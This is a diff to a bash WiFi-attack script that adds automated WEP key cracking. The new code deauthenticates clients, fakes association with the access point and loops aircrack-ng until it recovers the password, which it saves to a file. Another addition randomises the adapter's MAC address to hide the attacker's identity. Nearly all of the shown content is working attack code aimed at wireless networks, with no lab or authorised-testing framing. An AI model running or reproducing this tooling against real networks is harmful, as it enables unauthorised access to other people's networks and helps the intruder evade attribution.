@@ -1,7 +1,10 @@
 #!/bin/bash
 
-# version: 3.5 27/1/25 02:20
+# version: 3.5.1 8/2/25 05:30
 
+
+### Changlog ###
+# 3.5.1 - Added WEP cracking.
 
 ### FIX ###
 # delay between scan to output
@@ -102,15 +105,6 @@ function check_wordlist() {
             wait
         fi
     fi
-    
-    # Remove passwords less than 8 length from rockyou.txt, because wifi pass is minimum 8 length.
-    if [ -f "$wordlists_dir/rockyou-8.txt" ]; then
-        :
-    else
-        echo "Filtering rockyou.txt for 8+ character passwords..."    
-        grep -E '^.{8,}$' "$rockyou_file" > "$wordlists_dir/rockyou-8.txt" # Create filtered wordlist (8+ chars only)
-    fi
-    rockyou_file="$wordlists_dir/rockyou-8.txt"
 
     # Check if oui.txt exists - for vendors names
     if [ -f "$oui_file" ]; then
@@ -167,13 +161,26 @@ function adapter_config() {
 	fi
 }
 
+# ------------------------------
+# Change adapter mac address
+# ------------------------------
+function spoof_adapter_mac() {
+	# Spoof Adapter mac address to random address
+	echo -e "\nRandomizing our wifi adapter mac address:"
+	
+	sudo ifconfig ${wifi_adapter}mon down
+        sudo macchanger -r ${wifi_adapter}mon > /dev/null 2>&1
+        sudo ifconfig ${wifi_adapter}mon up
+        sudo macchanger -s ${wifi_adapter}mon
+	random_mac=$(ip link show ${wifi_adapter}mon | awk '/link\/ieee802.11/ {print $2}') 
+}
 
 # ------------------------------
 # Network Scanner
 # ------------------------------
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=20
+        countdown_duration=4
         sudo gnome-terminal --geometry=110x35-10000-10000 -- bash -c "sudo timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
         echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
@@ -332,7 +339,11 @@ function choose_network() {
         elif [[ "$encryption" == "WPA3" ]]; then
             echo -e "\033[1mThe encryption is "$encryption". This script can't crack it yet.\033[0m"
             echo -e "Choose different Network.\n"
-            continue            
+            continue           
+        elif [[ "$encryption" == "WEP" ]]; then
+            echo -e "\033[1mThe encryption is "$encryption". This is easy to hack.\033[0m"
+	    crack_wep
+            continue                    
         fi
 
         # Check if we already have the Wi-Fi password for this BSSID
@@ -554,6 +565,57 @@ function deauth_attack() {
 
 
 # -------------------------
+# Crack WEP Encryption
+# -------------------------
+function crack_wep() {
+    output_file="$targets_path/$bssid_name/WEP_output.txt"
+    if [ -d "$targets_path/$bssid_name" ]; then
+        rm -rf "$targets_path/$bssid_name"
+    fi
+    mkdir "$targets_path/$bssid_name"
+    touch $output_file
+
+    echo -e "Usually capture between 30K-50K IVs [the #Data field] is enough to crack the WEP password.\n"
+    echo -e "[*] Starting packet capture...\n\n" 
+    
+    gnome-terminal --wait --geometry=92x17-10000-10000 -- bash -c "sudo airodump-ng --bssid $bssid_address --channel $channel --write "$targets_path/$bssid_name/$bssid_name" ${wifi_adapter}mon" &
+    airodump_pid=$!
+
+    sleep 10
+    
+    # Deauth clinets for faster packet capture
+    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "$wifi_adapter"mon
+    
+    # Fake connecting to the AP
+    gnome-terminal --geometry=78x4-10000-10000 -- bash -c "sudo aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}mon"
+
+    while true; do
+        if grep -q "KEY FOUND!" "$output_file"; then
+            kill "$airodump_pid"
+            break
+        fi
+    
+        gnome-terminal --wait --geometry=84x23-10000+10000 -- bash -c "sudo timeout 5 aircrack-ng -b $bssid_address $targets_path/$bssid_name/$bssid_name-01.cap | tee $targets_path/$bssid_name/WEP_output.txt"
+    
+        sleep 3
+    done
+
+    if grep -q "ASCII:" "$output_file"; then
+        wifi_pass=$(grep "ASCII:" $targets_path/$bssid_name/WEP_output.txt | sed -E 's/.*ASCII: ([^)]*).*/\1/')
+    else
+        wifi_pass=$(grep -oP 'KEY FOUND! \[ \K[0-9A-F:]+(?=\s\])' $targets_path/$bssid_name/WEP_output.txt | tr -d ':')            
+    fi
+
+    echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m	Important: The password may be in Upper or Lower case or both. Try them if the password is not correct."
+    echo -e \n--- >> $targets_path/wifi_passwords.txt
+    printf "The wifi password of $bssid_name ($bssid_address) is:   $wifi_pass" >> "$targets_path/wifi_passwords.txt"
+
+    cleanup
+    exit 0
+}
+
+
+# -------------------------
 # Dictionary Attack
 # -------------------------
 function dictionary_attack() {
@@ -764,7 +826,7 @@ function brute-force_attack() {
 function enable_gpu() {
     # Check if running in a VM
     if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
-        echo -e "\nYou are running inside a virtual machine. GPU acceleration may not be available."
+        echo -e "You are running inside a virtual machine. GPU is not available.\n"
         return 1
     fi
 
@@ -884,6 +946,7 @@ function choose_password_attack() {
 # ------------------------------
 function main_process() {
 	adapter_config
+	spoof_adapter_mac
 	network_scanner
 	devices_scanner
 	
